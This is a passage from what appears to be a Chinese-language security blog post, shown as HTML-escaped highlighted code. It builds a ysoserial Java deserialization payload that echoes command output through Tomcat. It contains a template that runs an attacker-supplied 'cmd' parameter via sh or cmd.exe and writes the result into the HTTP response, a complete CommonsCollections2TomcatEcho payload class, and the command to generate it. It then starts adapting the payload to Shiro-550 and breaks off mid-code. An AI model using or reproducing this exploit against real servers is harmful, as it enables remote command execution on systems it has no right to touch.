&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; } else if (cmd != null) {\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; javax.servlet.ServletResponse responseFacade = (javax.servlet.ServletResponse)lastServicedResponse.get();\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; responseFacade.getWriter();\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; java.io.Writer w = responseFacade.getWriter();\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; java.lang.reflect.Field responseField = org.apache.catalina.connector.ResponseFacade.classgetDeclaredField(\&amp;#34;response\&amp;#34;);\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; responseField.setAccessible(true);\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; org.apache.catalina.connector.Response response = (org.apache.catalina.connector.Response)responseField.get(responseFacade);\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; java.lang.reflect.Field usingWriter = org.apache.catalina.connector.Response.class.getDeclaredFiel(\&amp;#34;usingWriter\&amp;#34;);\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; usingWriter.setAccessible(true);\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; usingWriter.set((Object) response, Boolean.FALSE);\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; boolean isLinux = true;\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; String osTyp = System.getProperty(\&amp;#34;os.name\&amp;#34;);\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; if (osTyp != null &amp;amp;&amp;amp; osTyp.toLowerCase().contains(\&amp;#34;win\&amp;#34;)) {\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; isLinux = false;\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; }\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; String[] cmds = isLinux ? new String[]{\&amp;#34;sh\&amp;#34;, \&amp;#34;-c\&amp;#34;, cmd} : new String[]{\&amp;#34;cmd.exe\&amp;#34;, \&amp;#34;/c\&amp;#34;,cmd};\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; java.util.Scanner s = new java.util.Scanner(in).useDelimiter(\&amp;#34;\\\\a\&amp;#34;);\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; String output = s.hasNext() ? s.next() : \&amp;#34;\&amp;#34;;\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; w.write(output);\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; w.flush();\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34; }\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;} catch (Exception e) {\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;}&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">createTemplatesImpl&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">template&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后在payloads处添加对应的类（直接继承原有的CommonsCollectionsx即可）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// https://github.dev/kingkaki/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections2TomcatEcho.java
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">ysoserial.payloads&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections4.comparators.TransformingComparator&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections4.functors.InvokerTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ysoserial.payloads.util.Gadgets&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ysoserial.payloads.util.PayloadRunner&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ysoserial.payloads.util.Reflections&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.PriorityQueue&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Queue&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CommonsCollections2TomcatEcho&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">CommonsCollections2&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Queue&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#75af00">getObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">templates&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Gadgets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createTemplatesImplTomcatEcho&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// mock method name until armed
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span> &lt;span style="color:#111">transformer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;toString&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">],&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// create queue with numbers and basic comparator
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">PriorityQueue&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">queue&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">PriorityQueue&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">&amp;gt;(&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TransformingComparator&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformer&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// stub data for replacement later
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// switch method called by comparator
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Reflections&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformer&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;iMethodName&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;newTransformer&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// switch contents of queue
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">queueArray&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[])&lt;/span> &lt;span style="color:#111">Reflections&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;queue&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">queueArray&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">templates&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">queueArray&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">PayloadRunner&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">CommonsCollections2TomcatEcho&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>打包ysosrial&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2TomcatEcho cmd
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这样就相当于创建了一个从cmd参数获取要执行的命令的payload&lt;/p>
&lt;h3 id="适配shiro550">适配shiro550&lt;/h3>
&lt;p>上面这种方法已经很好了，但仍然存在一点点小限制&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">internalDoFilter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ServletRequest&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ServletResponse&lt;/span> &lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ServletException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">pos&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">n&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ApplicationFilterConfig&lt;/span> &lt;span style="color:#111">filterConfig&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">filters&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">pos&lt;/span>&lt;span style="color:#f92672">++];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Filter&lt;/span> &lt;span style="color:#111">filter&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">filterConfig&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getFilter&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isAsyncSupported&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#d88200">&amp;#34;false&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equalsIgnoreCase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">filterConfig&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getFilterDef&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getAsyncSupported&lt;/span>&lt;span style="color:#f92672">()))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAttribute&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;org.apache.catalina.ASYNC_SUPPORTED&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Boolean&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">FALSE&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Globals&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">IS_SECURITY_ENABLED&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Principal&lt;/span> &lt;span style="color:#111">principal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">HttpServletRequest&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">getUserPrincipal&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">SecurityUtil&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">doAsPrivilege&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;doFilter&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">filter&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">classType&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">principal&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">filter&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">doFilter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ServletException&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#111">RuntimeException&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#111">var15&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#111">var15&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Throwable&lt;/span> &lt;span style="color:#111">var16&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Throwable&lt;/span> &lt;span style="color:#111">e&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ExceptionUtils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">unwrapInvocationTargetException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">var16&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ExceptionUtils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">handleThrowable&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ServletException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">sm&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getString&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;filterChain.filter&amp;#34;&lt;/span>&lt;span style="color:#f92672">),&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
